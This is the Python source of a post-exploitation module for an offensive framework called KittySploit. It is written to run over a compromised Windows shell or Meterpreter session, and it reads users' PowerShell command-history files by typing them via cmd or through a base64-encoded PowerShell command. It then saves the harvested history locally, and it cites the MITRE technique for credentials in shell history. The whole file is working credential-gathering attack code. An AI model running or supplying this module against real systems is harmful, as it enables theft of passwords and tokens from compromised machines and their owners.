#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Read PSReadLine ConsoleHost_history.txt from a Windows session.

Works from cmd.exe by typing the history files directly. PowerShell is optional.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"

# Common PSReadLine history locations (expanded via cmd env vars)
_HISTORY_CANDIDATES = (
    r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"%APPDATA%\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"%LOCALAPPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
)


class Module(Post):
    __info__ = {
        "name": "Windows Gather PowerShell History",
        "description": (
            "Read PSReadLine command history files (Windows PowerShell and "
            "PowerShell Core) from a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1552.003/",
        ],
    }

    save_local = OptBool(True, "Save history under ./output", False)
    max_lines = OptInteger(500, "Maximum lines to return per history file", False)
    prefer_powershell = OptBool(
        False,
        "Prefer PowerShell when available (default: type history via cmd)",
        False,
        True,
    )

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _compat_failure(self):
        """Prefer NotCompatible when present (post-reload); else NoTarget."""
        return getattr(FailureType, "NotCompatible", None) or FailureType.NoTarget

    def _powershell_available(self) -> bool:
        for cmd in (
            'powershell -NoP -NonI -Command "Write-Output PS_OK"',
            'powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
            r'%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
        ):
            out = self._execute_cmd(cmd)
            if out and "PS_OK" in out:
                return True
        return False

    def _powershell_script(self, max_lines: int) -> str:
        return f"""
$ErrorActionPreference = 'Stop'
$limit = {int(max_lines)}
$candidates = @(
  (Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'),
  (Join-Path $env:APPDATA 'Microsoft\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'),
  (Join-Path $env:LOCALAPPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
) | Select-Object -Unique

$sections = New-Object System.Collections.Generic.List[string]
foreach ($path in $candidates) {{
  if (-not (Test-Path -LiteralPath $path)) {{ continue }}
  $lines = Get-Content -LiteralPath $path -ErrorAction Stop
  if ($lines.Count -gt $limit) {{
    $lines = $lines | Select-Object -Last $limit
    $header = "=== $path (last $limit lines) ==="
  }} else {{
    $header = "=== $path ($($lines.Count) lines) ==="
  }}
  $sections.Add("$header`n$($lines -join "`n")")
}}

if ($sections.Count -eq 0) {{
  Write-Output 'No PowerShell history files found.'
}} else {{
  $sections -join "`n`n"
}}
"""

    def _tail_lines(self, text: str, limit: int) -> str:
        lines = (text or "").splitlines()
        if len(lines) <= limit:
            return "\n".join(lines)
        return "\n".join(lines[-limit:])

    def _extract_via_cmd(self, limit: int) -> str:
        sections = []
        for pattern in _HISTORY_CANDIDATES:
            # Expand env and test existence in one cmd chain
            check = self._execute_cmd(f'if exist "{pattern}" (echo EXISTS) else (echo MISSING)')
            if not check or "EXISTS" not in check:
                continue
            # Resolve display path
            resolved = self._execute_cmd(f'echo {pattern}') or pattern
            resolved = resolved.strip().splitlines()[-1].strip() if resolved else pattern
            content = self._execute_cmd(f'type "{pattern}"')
            if content is None:
                content = ""
            # Filter obvious cmd noise / "file not found"
            if re.search(r"cannot find|not found|The system cannot find", content, re.I):
                continue
            body = self._tail_lines(content, limit)
            nlines = len(body.splitlines()) if body else 0
            if limit and nlines >= limit:
                header = f"=== {resolved} (last {limit} lines) ==="
            else:
                header = f"=== {resolved} ({nlines} lines) ==="
            sections.append(f"{header}\n{body}")

        if not sections:
            return "No PowerShell history files found."
        return "\n\n".join(sections)

    def check(self):
        # History files are readable via cmd; only need a live Windows session
        probe = self._execute_cmd("echo %OS%")
        if probe and "windows" not in probe.lower() and "Windows_NT" not in probe:
            # Soft check — adaptive shells may echo noisy output
            print_warning("Could not confirm Windows via %OS%; continuing anyway")
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"powershell_history_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(self._compat_failure(), "PowerShell history prerequisites not met")

        limit = self._int_opt(self.max_lines, 500, 1)
        print_status("Reading PowerShell command history...")

        use_ps = self._bool_opt(self.prefer_powershell, False) and self._powershell_available()
        if use_ps:
            print_info("Using PowerShell")
            result = self._run_powershell(self._powershell_script(limit))
        else:
            if self._bool_opt(self.prefer_powershell, False):
                print_warning("PowerShell preferred but not available — reading history via cmd")
            result = self._extract_via_cmd(limit)

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if re.search(r"No PowerShell history files found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"History saved to ./{local_path}")

        print_success("PowerShell history extraction completed")
        print_info(result)
        return True
